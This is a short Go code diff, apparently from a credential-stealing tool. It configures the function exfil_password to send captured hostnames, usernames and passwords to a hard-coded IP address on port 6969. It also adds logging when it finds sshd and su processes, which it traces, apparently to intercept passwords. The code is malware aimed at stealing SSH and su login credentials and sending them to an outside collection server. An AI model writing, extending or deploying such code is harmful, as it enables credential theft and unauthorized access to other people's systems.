@@ -52,7 +52,7 @@ func exfil_password(username, password string) {
 	if err != nil {
 		return
 	}
-	serverURL := "http://fill:6969/"
+	serverURL := "http://10.159.76.35:6969/"
 	values := url.Values{}
 	values.Set("hostname", hostname)
 	values.Set("username", username)
@@ -75,6 +75,7 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
+					fmt.Println("SSHD process found with PID:", pid)
 					go traceSSHDProcess(pid)
 					processed_pids = append(processed_pids, pid)
 				}
@@ -83,6 +84,7 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
+					fmt.Println("SU process found with PID:", pid)
 					go traceSUProcess(pid)
 					processed_pids = append(processed_pids, pid)
 				}
